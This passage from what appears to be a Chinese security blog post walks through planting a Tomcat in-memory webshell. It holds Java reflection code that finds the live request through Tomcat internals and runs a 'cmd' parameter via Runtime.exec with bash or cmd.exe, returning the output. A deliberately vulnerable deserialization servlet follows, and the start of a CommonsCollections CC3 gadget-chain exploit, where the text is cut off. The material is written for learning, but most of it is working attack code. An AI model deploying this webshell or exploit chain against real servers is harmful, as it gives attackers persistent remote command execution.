#6B737C\">//通过Http11NioProtocol（继承于AbstractProtocol）开始获取ConnectionHandler</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\"> getHandler </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.AbstractProtocol&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredMethod(</span><span style=\"color: #FFAB70\">&quot;getHandler&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">getHandler</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">AbstractEndpoint</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Handler</span><span style=\"color: #B392F0\"> connectionhandler </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">AbstractEndpoint</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">Handler</span><span style=\"color: #B392F0\">) </span><span style=\"color: #79B8FF\">getHandler</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">invoke(abstractProtocol);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #6B737C\">//开始获取connectionhandler中的global属性</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> globalField </span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;global&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">globalField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">RequestGroupInfo</span><span style=\"color: #B392F0\"> global</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(RequestGroupInfo) </span><span style=\"color: #79B8FF\">globalField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(connectionhandler);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #6B737C\">//global的作用就是用来缓存Processor的，因此它里面其实存储着很多Request请求的封装，具体的RequestInfo都是类似Http11Processor这种第二次封装进来的，我们还得判断出我们想要的那个RequestInfo</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> processorField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.RequestGroupInfo&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;processors&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">processorField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">ArrayList</span><span style=\"color: #B392F0\"> processors</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(ArrayList) </span><span style=\"color: #79B8FF\">processorField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(global);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">for</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> processor</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> processors)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">RequestInfo</span><span style=\"color: #B392F0\"> requestInfo </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(RequestInfo) processor;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #6B737C\">//这个判断条件就比较的灵活了，看各自当时去访问Memshell时路径的特点（就比如说我们注入了一个filter内存马，用cmd启动，那么就获取到当前请求的cmd参数时，判断为我们的内存马访问请求）</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">requestInfo</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getCurrentQueryString()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> reqfield</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.RequestInfo&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;req&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #79B8FF\">reqfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #F97583\">Request</span><span style=\"color: #B392F0\"> request</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(Request) </span><span style=\"color: #79B8FF\">reqfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(requestInfo);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Request</span><span style=\"color: #B392F0\"> currentreq</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">Request</span><span style=\"color: #B392F0\">) </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getNote(</span><span style=\"color: #F8F8F8\">1</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #6B737C\">//已经有request了，直接获取到参数给他exec就完事了</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> cmd</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">currentreq</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\">(cmd</span><span style=\"color: #F97583\">!=</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> cmds[]</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getProperty(</span><span style=\"color: #FFAB70\">&quot;os.name&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toLowerCase()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;win&quot;</span><span style=\"color: #B392F0\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                        cmds</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;/c&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">cmd&#125;;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    &#125;</span><span style=\"color: #F97583\">else</span><span style=\"color: #B392F0\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                        cmds</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #FFAB70\">&quot;/bin/bash&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;-c&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">cmd&#125;;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #6B737C\">//将执行结果通过我们获取到的request返回出去</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\"> inputStream</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Runtime</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRuntime()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">exec(cmds)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getInputStream();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\"> scanner</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> Scanner(inputStream)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">useDelimiter(</span><span style=\"color: #FFAB70\">&quot;//A&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> output </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">scanner</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext()</span><span style=\"color: #F97583\">?</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">scanner</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next()</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\"> writer</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">currentreq</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getResponse()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">write(output);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">flush();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">close();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                    </span><span style=\"color: #F97583\">break</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> e)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">e</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">printStackTrace();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h2><p>第一次去利用的时候发现，WebappclassLoader 的 getResources()方法，早在 8.5.78 的版本就被标价为了<code>@Deprecated</code>，直接就 return null 了，然后在 10.x 版本就直接移除了该方法，我不清楚服务器上的 Tomcat 源码如何，我个人用 idea 启动项目的话，也是直接 return null 的，所以导致构造失败。<br>如何解决这个问题呢？我这里采取的方法是利用反射将 Resources 取出来就好了，它本身 setResources 方法是没有被换掉的，所以还是会有赋值，其属性值还是会存在内存中。<br>所以在我看来，这个利用还是能够通杀很多版本的，不过就是需要这么点技巧，可能会在师傅们本地测试的卡一下。<br>然后是总结一下这个方法的思路：</p>\n<ol>\n<li>从 Tomcat 启动，到我们开始访问路由发送 http 请求开始，一整个调用栈的基础上进行的分析</li>\n<li>首先是在<code>Http11Processor</code>的基础上，我们发现了第一次对于 request 和 reponse 参数的处理以及传递，所以开始定位寻找他们。</li>\n<li>之后发现在<code>Http11Processor</code>的父类<code>AbstractProcessor</code>中发现了它两的定义。这样就好办了，即使我们找不到<code>AbstractProcessor</code>的定义，但是我们依然能够直接通过<code>Http11Processor</code>反射间接获取到 request 和 response</li>\n<li>之后我们分析到在<code>AbstractProtocol#ConnectorHandler</code>中进行了 Processor 的注册 registry，也就是说只要我们之前发送过一次，或者在当此请求中发送过 http1&#x2F;1 请求,就会将<code>Http11Processor</code>注册进<code>ConnectorHandler</code>的属性值 global，所以获取到<code>ConnectorHandler</code>就能够获取到<code>Http11Processor</code>。获取到<code>ConnectorHandler</code>就需要获取到<code>AbstractProtocol</code></li>\n<li>然后我们从 Tomcat 的整体架构入手，Connector 组件本身内置 ProtocolHandler 以及 Adopter，这里的 ProtocolHandler 就是<code>AbstractProtocol</code>了。所以我们又可以通过 StandService(Service 由 Connector 和 container 组成)的属性值<code>connectors</code>循环遍历到关于 Http11 的 connector，也就能够获取到我们想要的<code>AbstractProtocol</code>了。</li>\n</ol>\n<h1 id=\"反序列化打入内存马\"><a href=\"#反序列化打入内存马\" class=\"headerlink\" title=\"反序列化打入内存马\"></a>反序列化打入内存马</h1><h2 id=\"环境测试\"><a href=\"#环境测试\" class=\"headerlink\" title=\"环境测试\"></a>环境测试</h2><p>反序列化打入其实包括一切实战情况下，我们能够进行 Java 任意代码执行时，就能够尝试打入内存马，这里只是以最常见的反序列化执行 Java 代码作为学习。<br>并且思路其实也没那么难，甚至可以说我们只要将之前的东西进行一段段的拼接就行。<br>假设我们存在如下的反序列化攻击点：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ByteArrayInputStream</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ObjectInputStream</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Base64</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">@</span><span style=\"color: #F97583\">WebServlet</span><span style=\"color: #B392F0\">(</span><span style=\"color: #FFAB70\">&quot;/Vuln&quot;</span><span style=\"color: #B392F0\">)</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> vulnServlet  </span><span style=\"color: #F97583\">extends</span><span style=\"color: #B392F0\"> HttpServlet &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">protected</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> doPost(</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\"> req</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\"> resp) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ServletException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] bytes</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Base64</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDecoder()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">decode(</span><span style=\"color: #79B8FF\">req</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;data&quot;</span><span style=\"color: #B392F0\">));</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ByteArrayInputStream</span><span style=\"color: #B392F0\"> BAIS</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> ByteArrayInputStream(bytes);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ObjectInputStream</span><span style=\"color: #B392F0\"> objectInputStream</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> ObjectInputStream(BAIS);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">try</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(</span><span style=\"color: #79B8FF\">objectInputStream</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">readObject());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> e)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">e</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">printStackTrace();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><p>这个时候我们就构造一份 CC3 作为 sink 点，以 HashMap 起手的链子 generate 出的序列化数据来打</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">trax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TemplatesImpl</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">trax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TrAXFilter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">trax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TransformerFactoryImpl</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javassist</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ClassPool</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javassist</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">CtClass</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javassist</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">CtConstructor</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Transformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">functors</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ChainedTransformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">functors</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ConstantTransformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">functors</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">InstantiateTransformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">keyvalue</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TiedMapEntry</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: 